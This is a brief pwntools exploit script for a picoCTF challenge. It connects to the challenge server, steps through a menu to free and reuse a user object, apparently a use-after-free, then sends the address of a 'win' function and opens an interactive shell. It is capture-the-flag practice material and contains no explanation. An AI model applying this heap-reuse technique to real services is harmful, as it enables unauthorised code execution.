from pwn import *

elf = context.binary = ELF('./vuln')
context.log_level = 'debug'

p = remote('mercury.picoctf.net', 6312)
input()
p.sendlineafter('(e)xit\n', b'm')
p.sendlineafter('username: \n', b'ndgsghdj')
p.sendlineafter('(e)xit\n', b'i')
p.sendlineafter(')?\n', b'y')
p.sendlineafter('(e)xit\n', b'l')
p.send(p32(elf.sym.hahaexploitgobrrr))
p.interactive()
